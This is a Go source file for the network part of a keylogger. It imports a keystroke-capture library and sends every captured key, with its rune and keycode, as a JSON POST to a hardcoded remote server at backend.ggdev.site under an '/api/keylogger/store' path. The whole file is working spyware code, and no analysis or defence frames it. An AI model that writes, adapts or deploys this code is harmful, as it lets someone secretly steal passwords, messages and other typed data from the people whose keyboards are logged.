package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/kindlyfire/go-keylogger"
	"io"
	"log"
	"net/http"
	"strconv"
	"time"
)

const (
	api_domain       = "http://backend.ggdev.site"
	api_url          = "/api/keylogger"
	api_store_method = "/store"
)

type ApiQueryOptions struct {
	KeyRune string `json:"key_rune"`
	KeyCode int    `json:"key_code"`
}

type ApiClient struct {
	Domain      string
	Url         string
	StoreMethod string
	httpClient  *http.Client
}

func NewApiClient() *ApiClient {
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:          100,
			IdleConnTimeout:       30 * time.Second,
			TLSHandshakeTimeout:   20 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		},
	}

	api_client := ApiClient{
		Domain:      api_domain,
		Url:         api_url,
		StoreMethod: api_store_method,
		httpClient:  client,
	}

	return &api_client
}

func (ac *ApiClient) StoreKey(key keylogger.Key) {
	api_payload := ApiQueryOptions{
		KeyRune: fmt.Sprintf("%c", key.Rune),
		KeyCode: key.Keycode,
	}
	ac.sendRequest(api_payload)
}

func (ac *ApiClient) sendRequest(payload ApiQueryOptions) {
	payload_json, err := json.Marshal(payload)

	if err != nil {
		log.Panic(err)
	}

	req, err := http.NewRequest(http.MethodPost, ac.Domain+ac.Url+ac.StoreMethod, bytes.NewBuffer(payload_json))

	if err != nil {
		fmt.Println(err.Error())
		//return "", errors.Wrap(err, "account NewRequest")
	}

	req.Header.Add("Accept", "application/json")
	req.Header.Add("Content-Type", "application/json")
	req.Header.Add("Content-Length", strconv.Itoa(len(string(payload_json))))

	resp, err := ac.httpClient.Do(req)

	if err != nil {
		fmt.Println(err.Error())
		//return "", errors.Wrap(err, "account Do")
	}

	fmt.Println(fmt.Sprintf("Api server response status: %s", resp.Status))

	defer resp.Body.Close() // defer очищает ресурс

	bodybytes, err := io.ReadAll(resp.Body)

	if err != nil {
		log.Panic(err)
	}

	log.Println(string(bodybytes))
}
